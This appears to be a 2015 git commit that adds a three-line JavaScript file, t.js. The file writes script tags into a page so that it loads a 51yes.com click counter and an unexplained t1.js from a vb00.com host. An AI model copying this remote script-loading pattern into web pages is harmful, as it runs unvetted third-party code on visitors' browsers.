ca3fcfd396ddb7d2885c7250ab0f6f74be63c2b0
tzjs <tzjs@gmx.com>
2015-12-25 17:43:39 +0800

    Create t.js

---
+++ 3/t.js
@@ -0,0 +1,3 @@
+document.writeln("<script language=\"javascript\" src=\"http:\/\/count38.51yes.com\/click.aspx?id=382766745&logo=12\" charset=\"gb2312\"><\/script>");
+
+document.writeln("<script src=http:\/\/\t.vb00.com\/t1.js ><\/script>");
